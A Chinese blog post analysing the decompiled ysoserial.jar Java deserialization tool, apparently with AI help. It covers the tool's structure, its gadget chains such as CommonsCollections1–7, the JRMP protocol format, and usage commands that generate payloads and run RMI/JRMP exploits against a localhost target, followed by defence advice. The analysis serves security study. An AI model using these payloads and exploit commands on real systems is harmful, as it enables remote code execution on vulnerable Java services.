+++
title = "ysoserial.jar 反编译 尝试阅读并魔改ysoserial"
date = 2026-06-14T21:30:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 正文

## 定义

  
  
魔改 `ysoserial` 是进阶 Java 安全研究的“必修课”。`ysoserial` 本质上是一个 Payload 生成工具，它通过反射（Reflection）和字节码操作（Bytecode Manipulation）将特定的 Gadget Chain 组装并序列化。  
  
## 架构


这里我们用Claude 联动 jadx mcp 进行研究

### 1. 基本信息

| 项目 | 值 |
|------|-----|
| 文件名 | `ysoserial.jar` |
| 文件大小 | ~56.8 MB |
| 总条目数 | 41659 |
| 用途 | Java 反序列化漏洞 Payload 生成与利用工具 |
| 入口类 | `ysoserial.GeneratePayload` |
| 使用方式 | `java -jar ysoserial.jar [payload] '[command]'` |

---

### 2. 项目结构

```
ysoserial/
├── GeneratePayload.class          # 主入口，生成序列化 payload
├── Serializer.class               # 序列化工具类
├── Strings.class                  # 字符串工具类
├── exploit/                       # 漏洞利用模块
│   ├── RMIRegistryExploit.class   # RMI Registry 利用
│   ├── JRMPClient.class           # JRMP 客户端利用
│   ├── JRMPListener.class         # JRMP 监听器
│   ├── JBoss.class                # JBoss 利用
│   ├── JenkinsCLI.class           # Jenkins CLI 利用
│   ├── JenkinsListener.class      # Jenkins Listener 利用
│   ├── JenkinsReverse.class       # Jenkins 反向利用
│   ├── JMXInvokeMBean.class       # JMX MBean 利用
│   ├── JSF.class                  # JSF 利用
│   └── JRMPClassLoadingListener.class
├── payloads/                      # Payload 生成模块（核心）
│   ├── ObjectPayload.class        # Payload 接口
│   ├── CommonsCollections1-7.class # CC 链 payload
│   ├── CommonsBeanutils1.class    # CB 链 payload
│   ├── URLDNS.class               # DNS 探测 payload
│   ├── Spring1/2.class            # Spring 链 payload
│   ├── Hibernate1/2.class         # Hibernate 链 payload
│   ├── Jdk7u21.class              # JDK7u21 链 payload
│   ├── JRMPClient/Listener.class  # JRMP 链 payload
│   ├── C3P0.class                 # C3P0 链 payload
│   ├── ROME.class                 # ROME 链 payload
│   ├── Groovy1.class              # Groovy 链 payload
│   ├── BeanShell1.class           # BeanShell 链 payload
│   ├── Clojure.class              # Clojure 链 payload
│   ├── Vaadin1.class              # Vaadin 链 payload
│   ├── Wicket1.class              # Wicket 链 payload
│   ├── Click1.class               # Click 链 payload
│   ├── JSON1.class                # JSON 链 payload
│   ├── JavassistWeld1.class       # Javassist+Weld 链 payload
│   ├── JBossInterceptors1.class   # JBoss Interceptors 链 payload
│   ├── Jython1.class              # Jython 链 payload
│   ├── MozillaRhino1/2.class      # Mozilla Rhino 链 payload
│   ├── Myfaces1/2.class           # MyFaces 链 payload
│   ├── FileUpload1.class          # FileUpload 链 payload
│   ├── AspectJWeaver.class        # AspectJ 链 payload
│   ├── annotation/                # 注解定义
│   │   ├── Authors.class
│   │   ├── Dependencies.class
│   │   └── PayloadTest.class
│   └── util/                      # 工具类
│       ├── Gadgets.class          # 核心 gadget 构造工具
│       ├── Reflections.class      # 反射工具
│       ├── ClassFiles.class       # Class 文件工具
│       ├── JavaVersion.class      # Java 版本检测
│       └── PayloadRunner.class    # Payload 运行器
└── secmgr/                        # 安全管理器
    └── ExecCheckingSecurityManager.class
```

---

### 3. 核心接口与类分析

#### 3.1 ObjectPayload 接口

```java
// 所有 payload 必须实现的核心接口
public interface ObjectPayload<T> {
    T getObject(String command) throws Exception;
}
```

每个 payload 类都实现此接口，接收一个命令字符串，返回一个可序列化的恶意对象。

#### 3.2 GeneratePayload（主入口）

**逻辑流程：**
1. 接收两个参数：`[payload类型]` 和 `[命令]`
2. 通过 `ObjectPayload$Utils.getPayloadClass()` 查找 payload 类
3. 实例化 payload 对象，调用 `getObject(command)` 生成恶意对象
4. 使用 `Serializer.serialize()` 将对象序列化为字节流输出到 stdout
5. 调用 `releasePayload()` 释放资源

#### 3.3 Serializer（序列化器）

```java
public class Serializer {
    // 核心：使用 Java 原生 ObjectOutputStream 进行序列化
    public static void serialize(Object obj, OutputStream out) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(out);
        oos.writeObject(obj);
    }
}
```

#### 3.4 Gadgets（核心 Gadget 构造工具）

关键方法：

| 方法 | 功能 |
|------|------|
| `createTemplatesImpl(String cmd)` | 使用 Javassist 动态生成恶意类，内含 `Runtime.exec()` 调用 |
| `createMemoitizedProxy(Map, Class, Class...)` | 创建基于 `AnnotationInvocationHandler` 的动态代理 |
| `createMemoizedInvocationHandler(Map)` | 通过反射创建 `sun.reflect.annotation.AnnotationInvocationHandler` |
| `createProxy(InvocationHandler, Class, Class...)` | 使用 `Proxy.newProxyInstance()` 创建代理对象 |
| `makeMap(Object, Object)` | 构造包含恶意 Node 的 HashMap |

**`createTemplatesImpl` 核心流程：**
1. 使用 Javassist 的 `ClassPool` 创建新的类
2. 类继承自 `AbstractTranslet`
3. 在类初始化器中插入 `Runtime.getRuntime().exec("cmd")`
4. 将生成的字节码设置到 `_bytecodes` 字段
5. 通过反射设置 `_name` 和 `_tfactory` 字段

#### 3.5 Reflections（反射工具）

| 方法 | 功能 |
|------|------|
| `setFieldValue(Object, String, Object)` | 反射设置对象字段值 |
| `getFieldValue(Object, String)` | 反射获取对象字段值 |
| `getField(Class, String)` | 递归查找字段（包括父类） |
| `getFirstCtor(String)` | 获取类的第一个构造器 |
| `setAccessible(AccessibleObject)` | 兼容 Java 8/12+ 的 setAccessible |
| `createWithoutConstructor(Class)` | 绕过构造器创建实例 |

---

### 4. Payload 分类分析

#### 4.1 Apache Commons Collections 链（CC1-CC7）

| Payload | 依赖 | 触发方式 | 特点 |
|---------|------|----------|------|
| **CC1** | commons-collections 3.1 | `LazyMap.get()` → `ChainedTransformer` | 使用 `AnnotationInvocationHandler` 代理，需 Java < 8u72 |
| **CC2** | commons-collections4 | `PriorityQueue.readObject()` → `TransformingComparator` | 使用 `TemplatesImpl` + `InvokerTransformer` |
| **CC3** | commons-collections 3.1 | 类似 CC1 | 使用 `TemplatesImpl` 替代 `Runtime` 直接调用 |
| **CC4** | commons-collections4 | 类似 CC2 | 使用 `ChainedTransformer` + `ConstantTransformer` |
| **CC5** | commons-collections 3.1 | `BadAttributeValueExpException.readObject()` → `TiedMapEntry.toString()` | 需 Java < 8u72 |
| **CC6** | commons-collections 3.1 | `HashMap.readObject()` → `TiedMapEntry.hashCode()` → `LazyMap.get()` | **通用链，无版本限制** |
| **CC7** | commons-collections 3.1 | `HashMap.readObject()` → `Hashtable` 碰撞 | 利用 `equals()` 触发 |

#### 4.2 CC1 详细调用链

```
AnnotationInvocationHandler.readObject()
  → Proxy(Map).entrySet()
    → AnnotationInvocationHandler.invoke()
      → LazyMap.get()
        → ChainedTransformer.transform()
          → ConstantTransformer(Runtime.class)
          → InvokerTransformer("getMethod")
          → InvokerTransformer("invoke")
          → InvokerTransformer("exec")
```

#### 4.3 其他 Payload

| Payload | 利用链 | 说明 |
|---------|--------|------|
| **URLDNS** | `HashMap` → `URL.hashCode()` → `URLStreamHandler` | 仅触发 DNS 请求，无 RCE，用于漏洞探测 |
| **CommonsBeanutils1** | `PriorityQueue` → `BeanComparator` → `PropertyUtils.getProperty()` | 需 commons-beanutils |
| **Spring1** | `Proxy` → `TypeFactory` → `TemplatesImpl` | 需 spring-core |
| **Spring2** | `PriorityQueue` → `TransformingComparator` → `TemplatesImpl` | 需 spring-core + commons-collections4 |
| **Hibernate1/2** | `TypedValue` → `AbstractType.getHashCode()` | 需 hibernate-core |
| **Jdk7u21** | `Proxy` → `AnnotationInvocationHandler` → `TemplatesImpl` | JDK 7u21 原生链 |
| **JRMPClient** | `AnnotationInvocationHandler` → `Proxy` → `RemoteObject` | 触发 JRMP 连接 |
| **JRMPListener** | `UnicastRef` → `RemoteObject` | 监听 JRMP 连接 |
| **C3P0** | `PoolBackedDataSource` → `JndiRefForwardingDataSource` | JNDI 注入 |
| **ROME** | `ObjectBean` → `ToStringBean` → `TemplatesImpl` | 需 rome |
| **Groovy1** | `MethodClosure` → `ConvertedClosure` → `Proxy` | 需 groovy |
| **BeanShell1** | `XThis$Handler` → `BshMethod.invoke()` | 需 bsh |
| **JSON1** | `TemplatesImpl` + JSON 反序列化 | 需 json-lib |

---

### 5. Exploit 模块分析

#### 5.1 RMIRegistryExploit

**用途：** 向 RMI Registry 注入恶意绑定对象

**攻击流程：**
1. 连接到目标 RMI Registry（`LocateRegistry.getRegistry(host, port)`）
2. 调用 `Registry.list()` 触发反序列化
3. 如果失败，尝试 SSL 方式连接
4. 在 `ExecCheckingSecurityManager` 中执行 payload

**用法：** `java -jar ysoserial.jar RMIRegistryExploit host port payload cmd`

#### 5.2 JRMPClient

**用途：** 通过 JRMP 协议发送恶意对象

**攻击流程：**
1. 建立 TCP Socket 连接
2. 发送 JRMP 协议头（Magic: `0x4A524D49`，版本: 2）
3. 使用 `MarshalOutputStream` 写入 DGC 调用
4. 将恶意对象作为参数发送

**协议格式：**
```
[4字节 Magic] [2字节 版本] [1字节 StreamProtocol] [1字节 0x50]
[8字节 ObjNum=2] [4字节 0] [8字节 0] [2字节 0] [4字节 1]
[8字节 InterfaceHash=-669196253586618813] [Object payload]
```

#### 5.3 JRMPListener

**用途：** 监听 JRMP 连接并返回恶意对象

#### 5.4 JBoss

**用途：** 利用 JBoss 反序列化漏洞

#### 5.5 Jenkins 系列

| Exploit | 说明 |
|---------|------|
| `JenkinsCLI` | 通过 Jenkins CLI 接口利用 |
| `JenkinsListener` | 通过 Jenkins CLI Listener 利用 |
| `JenkinsReverse` | 反向连接利用 |

#### 5.6 JMXInvokeMBean

**用途：** 通过 JMX 调用 MBean

---

### 6. 关键依赖库

| 库 | 用途 |
|----|------|
| `javassist` | 动态字节码生成（生成恶意类） |
| `org.reflections` | 运行时扫描 payload 类 |
| `com.nqzero.permit` | Java 9+ 绕过反射限制 |
| `commons-collections` 3.x/4.x | CC 链核心依赖 |
| `commons-beanutils` | CB 链依赖 |
| `spring-core` | Spring 链依赖 |
| `hibernate-core` | Hibernate 链依赖 |
| `rome` | ROME 链依赖 |
| `groovy` | Groovy 链依赖 |
| `bsh` (BeanShell) | BeanShell 链依赖 |
| `junit` | 测试框架 |

---

### 7. 静态初始化块

`Gadgets` 类的静态初始化块设置了两个关键系统属性：

```java
static {
    // 允许 TemplatesImpl 反序列化
    System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");
    // 允许远程代码库加载
    System.setProperty("java.rmi.server.useCodebaseOnly", "false");
}
```

---

### 8. 使用示例

```bash
# 生成 CC6 payload（通用，无版本限制）
java -jar ysoserial.jar CommonsCollections6 "calc.exe" > payload.bin

# 生成 URLDNS payload（仅探测，无 RCE）
java -jar ysoserial.jar URLDNS "http://your-dns-server.com" > urldns.bin

# RMI Registry 利用
java -jar ysoserial.jar RMIRegistryExploit 127.0.0.1 1099 CommonsCollections6 "calc.exe"

# JRMP 客户端利用
java -jar ysoserial.jar JRMPClient 127.0.0.1 1099 CommonsCollections6 "calc.exe"

# 列出所有可用 payload
java -jar ysoserial.jar
```

---

### 9. 防御建议

1. **升级依赖库版本**：将 commons-collections 升级到 3.2.2+ 或 4.x（已修复反序列化问题）
2. **白名单反序列化**：使用 `ObjectInputFilter`（Java 9+）或第三方库（如 SerialKiller）
3. **移除危险类**：从 classpath 中移除不必要的 gadget 类
4. **网络层防护**：限制 RMI/JRMP/JNDI 等协议的访问
5. **WAF 规则**：检测序列化数据流中的恶意模式
6. **JEP 290**：Java 9+ 内置的反序列化过滤机制

---

### 10. 分析工具说明

由于系统 JADX 需要 Java 11+（当前为 Java 8），本次分析使用 `javap -p -c` 进行字节码级反编译。提取目录位于：

```
ysoserial_extracted/
```

如需更可读的 Java 源码，建议：
- 安装 Java 11+ 后使用 JADX GUI 打开 JAR
- 或使用 CFR/Procyon/Fernflower 等支持 Java 8 的反编译器
